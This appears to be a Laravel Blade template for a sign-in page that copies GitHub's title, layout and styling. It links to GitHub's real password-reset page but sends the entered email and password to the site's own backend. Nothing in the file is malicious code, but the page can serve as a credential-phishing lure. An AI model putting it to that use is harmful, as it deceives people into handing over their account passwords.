<!DOCTYPE html>
<html lang="en"><head>
    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <meta charset="utf-8">
    <link rel="stylesheet" href="{{ URL::asset('web/css/frameworks.css') }}" />
    <link rel="stylesheet" href="{{ URL::asset('web/css/github.css') }}" />
    <link rel="stylesheet" href="{{ URL::asset('web/css/site.css') }}" />

    <meta name="viewport" content="width=device-width">
    <title>Sign in to GitHub · GitHub</title>
</head>

<body class="logged-out env-production session-authentication page-responsive min-width-0">

<div role="main">
    <div id="js-pjax-container" data-pjax-container="">
        <div class="auth-form px-3 mt-6" id="login">
            <form accept-charset="UTF-8" action="{{ route('webUserPostLogin') }}" method="post">
                @if (count($errors) > 0)
                    <div id="js-flash-container">
                        <div class="flash flash-full flash-error">
                            <div class="container">
                                {{ $errors->all()[0] }}
                            </div>
                        </div>
                    </div>
                @endif

                {{ csrf_field() }}
                <div class="auth-form-body mt-3">

                    <label for="login_field">
                        Username or email address
                    </label>
                    <input autocapitalize="off" autocorrect="off" class="form-control input-block" id="login_field" name="email" tabindex="1" value="{{ old('email') }}" type="text">

                    <label for="password">
                        Password <a href="https://github.com/password_reset" class="label-link">Forgot password?</a>
                    </label>
                    <input autofocus="autofocus" class="form-control form-control input-block" id="password" name="password" tabindex="2" type="password">

                    <input class="btn btn-primary btn-block" data-disable-with="Signing in…" name="commit" tabindex="3" value="Sign in" type="submit">
                </div>
            </form>
        </div>
    </div>
</div>

</body>
</html>